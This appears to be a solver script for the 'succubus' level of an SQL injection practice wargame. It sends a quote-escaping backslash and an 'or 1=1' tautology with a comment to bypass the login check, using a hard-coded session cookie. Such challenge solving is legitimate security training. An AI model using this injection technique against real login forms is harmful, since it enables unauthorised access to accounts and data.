import requests

url='https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php?'
cookie={'PHPSESSID':'pgsatqanllcknmpsej9756rtqq'}

def solve():
    query="id=\&pw=or 1=1 %23"
    res = requests.get(url=url+query, cookies=cookie)
    if "SUCCUBUS Clear!" in res.text:
        print("SUCCUBUS Clear!")

if __name__ == "__main__":
    solve()